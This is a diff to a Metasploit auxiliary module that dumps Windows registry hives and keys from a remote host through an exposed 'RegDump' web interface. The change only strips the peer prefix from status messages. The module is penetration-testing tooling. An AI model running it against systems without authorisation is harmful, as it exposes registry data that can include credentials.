@@ -67,9 +67,9 @@ class MetasploitModule < Msf::Auxiliary
     end
     vars_get = { 'str_Base' => hive }
     if key.eql?('')
-      print_status("#{peer} - Retrieving registry hive '#{hive}'...")
+      print_status("Retrieving registry hive '#{hive}'...")
     else
-      print_status("#{peer} - Retrieving registry key '#{hive}\\\\#{key}'...")
+      print_status("Retrieving registry key '#{hive}\\\\#{key}'...")
       vars_get['str_SubKey'] = key
     end
     res = send_request_cgi({
@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
     elsif res.code && res.code == 404
       fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
     elsif res.code && res.code == 200 && res.body && res.body =~ /\AKEY: /
-      print_good("#{peer} - Retrieved key successfully (#{res.body.length} bytes)")
+      print_good("Retrieved key successfully (#{res.body.length} bytes)")
     elsif res.code && res.code == 200 && res.body && res.body =~ /the supplied subkey cannot be found/
       fail_with(Failure::NotFound, "#{peer} - The supplied registry key does not exist")
     else
@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   def retrieve_hive_list
     hives = []
-    print_status("#{peer} - Retrieving list of registry hives ...")
+    print_status("Retrieving list of registry hives ...")
     res = send_request_cgi(
       'uri' => normalize_uri('RegDump'),
       'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
     elsif res.code && res.code == 200 && res.body && res.body =~ /RegDump\?str_Base/
       hives = res.body.scan(%r{<li><a href="\/RegDump\?str_Base=([a-zA-Z0-9_]+)">}).flatten
-      vprint_good("#{peer} - Found #{hives.length} registry hives (#{hives.join(', ')})")
+      vprint_good("Found #{hives.length} registry hives (#{hives.join(', ')})")
     else
       fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
     end
@@ -131,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
   def dump_all
     hives = retrieve_hive_list
     if hives.blank?
-      print_error("#{peer} - Found no registry hives")
+      print_error("Found no registry hives")
       return
     end
     hives.each { |hive| dump_key(hive) }
